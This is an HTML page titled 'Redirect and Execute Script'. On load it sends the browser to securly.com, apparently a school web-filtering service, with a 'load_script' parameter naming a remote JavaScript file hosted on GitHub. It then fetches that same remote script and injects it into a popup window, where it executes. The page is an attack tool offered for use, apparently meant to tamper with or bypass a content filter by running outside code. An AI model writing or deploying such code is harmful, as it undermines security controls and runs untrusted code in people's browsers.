<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect and Execute Script</title>
    <script>
        window.addEventListener('load', () => {
            const redirectUrl = 'https://securly.com'; // Target domain
            const scriptUrl = 'https://raw.githubusercontent.com/Dy1ngRat/pupet/refs/heads/main/action.js';

            // Redirect the main page to securly.com
            const queryParam = encodeURIComponent(scriptUrl);
            const finalUrl = `${redirectUrl}?load_script=${queryParam}`;

            // Open securly.com with script inclusion via query parameter
            window.location.href = finalUrl;

            // Optionally, open an about:blank window for debugging
            const newWindow = window.open('about:blank', '_blank', 'width=500,height=300');
            if (newWindow) {
                newWindow.document.write('<!DOCTYPE html><html><head><title>Debug Window</title></head><body></body></html>');
                newWindow.document.close();

                // Fetch and inject script into the blank page for debugging purposes
                fetch(scriptUrl)
                    .then(response => response.text())
                    .then(scriptContent => {
                        const scriptElement = newWindow.document.createElement('script');
                        scriptElement.textContent = scriptContent;
                        newWindow.document.body.appendChild(scriptElement);
                    })
                    .catch(error => console.error('Error loading script:', error));
            }
        });
    </script>
</head>
<body>
    <h1>Redirecting to Securly...</h1>
</body>
</html>
